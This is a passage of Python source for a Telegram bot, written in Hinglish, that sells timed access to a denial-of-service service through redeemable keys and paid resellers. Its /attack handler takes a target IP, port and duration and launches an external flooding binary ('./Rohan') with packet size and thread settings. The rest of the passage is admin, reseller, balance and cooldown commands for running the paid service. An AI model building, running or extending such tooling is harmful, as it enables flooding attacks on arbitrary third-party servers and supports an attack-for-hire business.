        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS and user_id not in users:
        response = "🚫 *Bhai, tu kaun? Unauthorized\\!* 😜\n📞 OWNER: @Rahul_618\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi authorized ho\\! Shukriya\\!* 🙌"
        gif_url = get_giphy_url("access denied")
        try:
            if gif_url:
                bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2')
            else:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"handle_attack failed: {e}")
            bot.reply_to(message, response.replace('\\', ''))
        return

    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "⏰ *Tera time khatam, bhai\\!* Contact admin to renew. 😎\n══════ 🌌 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Legend, aapke liye naya access abhi set karte hain\\! Shukriya\\!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return

    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            response = f"😎 *Thoda chill kar, bhai\\!* Cooldown: *{int(remaining_cooldown)} sec* ⏳\n══════ 🚀 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *Boss, aapke liye cooldown bhi style mein hai\\! Shukriya\\!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return

    command = message.text.split()
    if len(command) != 4:
        response = "🔥 *Attack Mode\\!* 🔥\n══════ 🌌 ══════\nUsage: `/attack <ip> <port> <time>`\nExample: `/attack 192.168.1.1 80 120`"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Ruler, aapka attack toh epic hoga\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return

    target, port, time = command[1], command[2], command[3]
    try:
        port = int(port)
        time = int(time)
        if time > 240:
            response = "⏰ *Bhai, 240 sec se zyada nahi\\!* 😅\n══════ 🌌 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *Boss, aapke liye limits bhi badhayenge\\! Shukriya\\!* 🙌"
            gif_url = get_giphy_url("time")
            try:
                if gif_url:
                    bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2')
                else:
                    bot.reply_to(message, response, parse_mode='MarkdownV2')
            except telebot.apihelper.ApiTelegramException as e:
                print(f"handle_attack failed: {e}")
                bot.reply_to(message, response.replace('\\', ''))
            return
        record_command_logs(user_id, 'attack', target, port, time)
        log_command(user_id, target, port, time)
        username = message.chat.username or "No username"
        execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
    except ValueError:
        response = "😓 *Kuch galat input, bhai\\!* Port aur time number mein daal. 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Legend, aapke liye sab clear karte hain\\! Shukriya\\!* 🙌"
        gif_url = get_giphy_url("error")
        try:
            if gif_url:
                bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2')
            else:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"handle_attack failed: {e}")
            bot.reply_to(message, response.replace('\\', ''))

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    try:
        packet_size = 1200
        if packet_size < 1 or packet_size > 65507:
            response = "😓 *Arre, packet size galat hai\\!* 1–65507 ke beech rakh, bhai\\! 👽"
            bot.send_message(chat_id, response, parse_mode='MarkdownV2')
            return
        full_command = ["./Rohan", target, str(port), str(time), str(packet_size)]
        response = (
            f"🔥 *Attack Shuru, Bhai\\!* 🔥\n"
            f"══════ 🌌 ══════\n"
            f"🎯 *Target*: {sanitize_markdown_v2(target)}:{port}\n"
            f"⏰ *Time*: {time} sec\n"
            f"📦 *Packet Size*: {packet_size} bytes\n"
            f"⚡ *Threads*: 512\n"
            f"👨‍💻 *Attacker*: @{sanitize_markdown_v2(username)}\n"
            f"📊 *Progress*: [Starting...]\n"
            f"══════ 🚀 ══════"
        )
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh server ke baap ho\\! Shukriya\\!* 🙌"
        image_url = get_pexels_image("hacker")
        try:
            if image_url:
                bot.send_photo(chat_id, image_url, caption=response, parse_mode='MarkdownV2')
            else:
                bot.send_message(chat_id, response, parse_mode='MarkdownV2')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"execute_attack failed: {e}")
            bot.send_message(chat_id, response.replace('\\', ''))
        msg = bot.send_message(chat_id, "📊 *Progress Updating...* 🌠", parse_mode='MarkdownV2')
        for i in range(1, 13):
            time.sleep(time / 12)
            progress = i * 8.33
            bar = "█" * int(progress // 8.33) + "□" * (12 - int(progress // 8.33))
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=msg.message_id,
                    text=f"📊 *Progress*: [{sanitize_markdown_v2(bar)} {progress:.1f}%] 🌠",
                    parse_mode='MarkdownV2'
                )
            except telebot.apihelper.ApiTelegramException as e:
                print(f"execute_attack progress update failed: {e}")
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=msg.message_id,
                    text=f"📊 Progress: [{bar} {progress:.1f}%] 🌠"
                )
        subprocess.run(full_command, check=True)
        threading.Timer(time, send_attack_finished_message, [chat_id, user_id]).start()
        last_attack_time[user_id] = datetime.datetime.now()
    except Exception as e:
        gif_url = get_giphy_url("error")
        response = f"😓 *Arre, kuch gadbad\\!* Error: {sanitize_markdown_v2(str(e))} 😱"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *Boss, aapke liye fix karte hain\\! Shukriya\\!* 🙏"
        try:
            if gif_url:
                bot.send_animation(chat_id, gif_url, caption=response, parse_mode='MarkdownV2')
            else:
                bot.send_message(chat_id, response, parse_mode='MarkdownV2')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"execute_attack error message failed: {e}")
            bot.send_message(chat_id, response.replace('\\', ''))

# Admin & Reseller Commands
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/genkey")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    response = "🔑 *Key Banane ka Time\\!* 🔑\n══════ 🌌 ══════\nKaunsa key chahiye? 😎"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *Boss, aapke keys toh sabke dil unlock karenge\\! Shukriya\\!* 🙌"
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_genkey_menu())
    except telebot.apihelper.ApiTelegramException as e:
        print(f"generate_key failed: {e}")
        bot.reply_to(message, response.replace('\\', ''), reply_markup=create_genkey_menu())

@bot.message_handler(commands=['redeem'])
def redeem_key_prompt(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/redeem")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    response = "🗝️ *Apna Key Daal, Bhai\\!* 🗝️\n══════ 🚀 ══════"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Ruler, aapke key se sab unlock ho jayega\\! Shukriya\\!* 🙌"
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    except telebot.apihelper.ApiTelegramException as e:
        print(f"redeem_key_prompt failed: {e}")
        bot.reply_to(message, response.replace('\\', ''))
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    key = message.text.strip()
    if key in keys:
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                response = "😎 *Bhai, tera access already hai\\!*\n══════ 🌌 ══════"
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *O Boss, aap toh waise bhi king ho\\! Shukriya\\!* 🙌"
                bot.reply_to(message, response, parse_mode='MarkdownV2')
                return
            else:
                del users[user_id]
                save_users()
        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)
        else:
            response = "😓 *Ye key kuch galat hai, bhai\\!*\n══════ 🌌 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *Boss, aapke liye naya key banate hain\\! Shukriya\\!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        response = f"🎉 *Access Mil Gaya, Bhai\\!* 🎉\n══════ 🚀 ══════\n⏰ *Expires on*: {sanitize_markdown_v2(users[user_id])}"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Legend, aapke liye sab kuch perfect\\! Shukriya\\!* 🙌"
        gif_url = get_giphy_url("success")
        try:
            if gif_url:
                bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2')
            else:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"process_redeem_key failed: {e}")
            bot.reply_to(message, response.replace('\\', ''))
    else:
        response = "😥 *Ye key galat ya expire ho gaya\\!* 😎\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Ruler, aapke liye naya key abhi banate hain\\! Shukriya\\!* 🙌"
        gif_url = get_giphy_url("error")
        try:
            if gif_url:
                bot.send_animation(message.chat.id, gif_url, caption=response, parse_mode='MarkdownV2')
            else:
                bot.reply_to(message, response, parse_mode='MarkdownV2')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"process_redeem_key failed: {e}")
            bot.reply_to(message, response.replace('\\', ''))

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/logs")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in ADMIN_IDS:
        response = "📋 *Latest Logs, Bhai\\!* 📋\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *Boss, aapke liye sab crystal clear\\! Shukriya\\!* 🙌"
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file, caption=response, parse_mode='MarkdownV2')
            except FileNotFoundError:
                response = "😓 *Koi log nahi mila, bhai\\!*\n══════ 🌌 ══════"
                bot.reply_to(message, response, parse_mode='MarkdownV2')
        else:
            bot.reply_to(message, "😓 *Koi log nahi mila, bhai\\!*\n══════ 🌌 ══════", parse_mode='MarkdownV2')
    else:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab jante ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/users")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab jante ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    response = "👥 *Authorized Users, Bhai\\!* 👥\n══════ 🌌 ══════\n"
    if user_id in SUPER_ADMIN_IDS:
        response += "👑 *O Legend, aapke users aapki army hain\\! Shukriya\\!* 🙌\n"
    if users:
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            response += f"🆔 *User ID*: {user}\n👤 *Username*: @{sanitize_markdown_v2(username)}\n⏰ *Expires*: {sanitize_markdown_v2(formatted_expiration)}\n\n"
    else:
        response += "😕 *Koi user nahi mila, bhai\\!*"
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    except telebot.apihelper.ApiTelegramException as e:
        print(f"list_authorized_users failed: {e}")
        bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/resellers")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in ADMIN_IDS:
        response = "🤝 *Authorized Resellers, Bhai\\!* 🤝\n══════ 🪐 ══════\n"
        if user_id in SUPER_ADMIN_IDS:
            response += "👑 *Boss, aapke resellers aapka empire chalate hain\\! Shukriya\\!* 🙌\n"
        if resellers:
            for reseller_id, balance in resellers.items():
                reseller_username = bot.get_chat(reseller_id).username if bot.get_chat(reseller_id) else "Unknown"
                response += f"👤 *Username*: {sanitize_markdown_v2(reseller_username)}\n🆔 *UserID*: {reseller_id}\n💰 *Balance*: {balance} Rs\n\n"
        else:
            response += "😕 *Koi reseller nahi mila\\!*"
        try:
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        except telebot.apihelper.ApiTelegramException as e:
            print(f"show_resellers failed: {e}")
            bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))
    else:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab jante ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab kar sakte ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 3:
        response = "📝 *Usage*: `/add_reseller <user_id> <balance>`\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Ruler, aapke liye sab easy hai\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        response = "😓 *Balance galat hai, bhai\\!* Number daal.\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *Boss, aapke liye sab clear karte hain\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        response = f"🎉 *Reseller Add Ho Gaya\\!*\n══════ 🚀 ══════\n🆔 *Reseller ID*: {reseller_id}\n💰 *Balance*: {initial_balance} Rs"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Legend, aapka empire aur bada hua\\! Shukriya\\!* 🙌"
        try:
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        except telebot.apihelper.ApiTelegramException as e:
            print(f"add_reseller failed: {e}")
            bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))
    else:
        response = f"😕 *Ye reseller {reseller_id} pehle se hai\\!*\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *Boss, aapke liye check karte hain\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab kar sakte ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 2:
        response = "📝 *Usage*: `/remove <User_ID>`\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Ruler, aapke liye sab easy hai\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        response = f"🗑️ *User {target_user_id} hata diya, bhai\\!*\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Legend, aapka hukum sar aankhon par\\! Shukriya\\!* 🙌"
    else:
        response = f"😕 *User {target_user_id} nahi mila\\!*\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *Boss, aapke liye check karte hain\\! Shukriya\\!* 🙌"
    try:
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    except telebot.apihelper.ApiTelegramException as e:
        print(f"remove_user failed: {e}")
        bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in ADMIN_IDS:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            response = "📝 *Usage*: `/addbalance <reseller_id> <amount>`\n══════ 🌌 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Ruler, aapke liye sab easy hai\\! Shukriya\\!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return
        reseller_id = command_parts[1]
        try:
            amount = float(command_parts[2])
            if reseller_id not in resellers:
                response = "😕 *Reseller ID nahi mila\\!*\n══════ 🌌 ══════"
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *Boss, aapke liye check karte hain\\! Shukriya\\!* 🙌"
                bot.reply_to(message, response, parse_mode='MarkdownV2')
                return
            resellers[reseller_id] += amount
            save_resellers(resellers)
            response = f"💰 *Balance Add Ho Gaya\\!*\n══════ 🚀 ══════\n💸 *Amount*: {amount} Rs\n🆔 *Reseller ID*: {reseller_id}\n📊 *New Balance*: {resellers[reseller_id]} Rs"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Legend, aapka empire aur ameer hua\\! Shukriya\\!* 🙌"
            try:
                bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
            except telebot.apihelper.ApiTelegramException as e:
                print(f"add_balance failed: {e}")
                bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))
        except ValueError:
            response = "😓 *Amount galat hai, bhai\\!*\n══════ 🌌 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *Boss, aapke liye sab clear karte hain\\! Shukriya\\!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
    else:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab kar sakte ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in ADMIN_IDS:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            response = "📝 *Usage*: `/remove_reseller <reseller_id>`\n══════ 🌌 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Ruler, aapke liye sab easy hai\\! Shukriya\\!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return
        reseller_id = command_parts[1]
        if reseller_id not in resellers:
            response = "😕 *Reseller ID nahi mila\\!*\n══════ 🌌 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *Boss, aapke liye check karte hain\\! Shukriya\\!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return
        del resellers[reseller_id]
        save_resellers(resellers)
        response = f"🗑️ *Reseller {reseller_id} hata diya, bhai\\!*\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Legend, aapka hukum sar aankhon par\\! Shukriya\\!* 🙌"
        try:
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        except telebot.apihelper.ApiTelegramException as e:
            print(f"remove_reseller failed: {e}")
            bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))
    else:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab kar sakte ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/balance")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"💰 *Tera Balance, Bhai\\!* 💰\n══════ 🚀 ══════\n📊 *Current Balance*: {current_balance} Rs"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aapka empire toh unlimited hai\\! Shukriya\\!* 🙌"
        try:
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        except telebot.apihelper.ApiTelegramException as e:
            print(f"check_balance failed: {e}")
            bot.reply_to(message, response.replace('\\', ''), reply_markup=create_main_menu(user_id))
    else:
        response = "😕 *Bhai, tu reseller nahi hai\\!*\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Ruler, aap toh sabke malik ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/setcooldown")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab kar sakte ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 2:
        response = "📝 *Usage*: `/setcooldown <seconds>`\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Ruler, aapke liye sab easy hai\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    try:
        seconds = int(command[1])
        if seconds <= 0:
            response = "😓 *Seconds 0 se zyada hone chahiye, bhai\\!*\n══════ 🌌 ══════"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *Boss, aapke liye fix karte hain\\! Shukriya\\!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return
        set_cooldown(seconds)
        response = f"⏳ *Cooldown set to {seconds} seconds, Bhai\\!*\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Legend, aapka hukum man liya\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    except ValueError:
        response = "😓 *Seconds number mein daal, bhai\\!*\n══════ 🌌 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *Boss, aapke liye sab clear karte hain\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.chat.id)
    log_interaction(user_id, "/checkcooldown")
    if message.chat.type != 'private':
        response = "🚫 *Bhai, ye bot sirf DM mein kaam karta hai\\!* 😎\n══════ 🌌 ══════"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Bhai, ye admin ke liye hai\\!* 😎\n══════ 🚀 ══════"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, aap toh waise bhi sab jante ho\\! Shukriya\\!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    response = f"⏳ *Current Cooldown*: {COOLDOWN_PERIOD} seconds\n══════ 🌌 ══════"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Ruler, aapke settings perfect hain\\! Shukriya\\!* 🙌"
    bot.reply_to(message, response, parse_mode='MarkdownV2')

# Start the bot
if __name__ == "__main__":
    load_cooldown()  # Load initial cooldown
    users.update(read_users())  # Load users from file
    keys.update(read_keys())  # Load keys from file
    resellers.update(load_resellers())  # Load resellers from file
    print("Bot is starting...")
    bot.polling(none_stop=True)